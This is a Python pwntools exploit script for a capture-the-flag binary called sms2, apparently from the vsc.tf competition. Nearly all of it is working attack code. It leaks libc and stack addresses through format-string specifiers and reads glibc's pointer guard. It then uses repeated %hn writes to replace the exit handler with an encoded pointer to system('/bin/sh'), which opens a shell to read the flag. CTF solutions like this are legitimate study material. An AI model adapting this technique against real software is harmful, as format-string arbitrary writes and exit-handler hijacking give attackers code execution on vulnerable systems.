#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sms2_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'vsc.tf', 7002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x1322
# breakrva 0x013d1
breakrva 0x144d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec sms2
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def send_payload(payload, addr=b'frantic'):
    io.sendlineafter(b'Message: ', addr)
    io.sendlineafter(b'name:', payload) 

def recv_leak():
    io.recvuntil(b'farewells,\n')
    leak = io.recvline().strip()
    return leak

def arb_write(where, what, rip):
    what = hex(what)[2:].rjust(16, '0')

    for i in range(16, 0, -2):
        val = int(what[i-2:i], 16)

        if val == 0x0:
            continue

        payload = f'%{val}c%12$hn'.encode()
        assert len(payload) <= 12
        
        send_payload(payload, p64(where))
        send_payload(f'%{0x20}c%12$hhn', p64(rip))


        log.info('payload: %#x -> %s', where, what)
        log.info('writing %#x', val)

        where += 1

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

# encrypt a function pointer
def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def exploit():
    global io
    io = initialize()

    # ===========================
    # leak libc and stack address
    # ===========================
    send_payload(b'%19$p|%23$p') 
    leak = recv_leak().split(b'|')
    libc.address = int(leak[0], 16) - 0x80faa
    rip = int(leak[1], 16) - 0x8
    send_payload(f'%{0x20}c%12$hhn', p64(rip)) # back to main

    # ===========================
    # leak ptr guard
    # ===========================
    ptr_guard_addr = libc.address - 0x2890
    send_payload('%12$s', p64(ptr_guard_addr)) 
    ptr_guard = u64(recv_leak().ljust(8, b'\x00'))
    send_payload(f'%{0x20}c%12$hhn', p64(rip))  # back to main

    # ===========================
    # overwriting exit handler
    # ===========================
    
    # somehow need this one to nullify the higher order bytes
    send_payload(f'%{0x1}c%12$n', p64(libc.sym['initial']+0x18+4))  # back to main
    send_payload(f'%{0x20}c%12$hhn', p64(rip))  # back to main

    val = encrypt(libc.sym['system'], ptr_guard)  
    arb_write(libc.sym['initial'] + 0x18, val, rip)
    val = next(libc.search(b'/bin/sh\x00'))
    arb_write(libc.sym['initial'] + 0x20, val, rip)

    # flavour/enum
    send_payload(f'%{0x4}c%12$n', p64(libc.sym['initial']+0x10))  # back to main
    send_payload(f'%{0x20}c%12$hhn', p64(rip))  # back to main

    # junk, to exit
    send_payload(b'pwned?')
    send_payload(b'pwned?')

    io.sendline(b'cat flag*')

    # ===========================
    # INFO
    # ===========================
    log.success('libc base: %#x', libc.address)
    log.success('libc initial: %#x', libc.sym['initial'])
    log.success('ptr guard @ %#x', ptr_guard_addr)
    log.success('ptr guard: %#x', ptr_guard)
    log.success('rip @ squirrel_set: %#x', rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()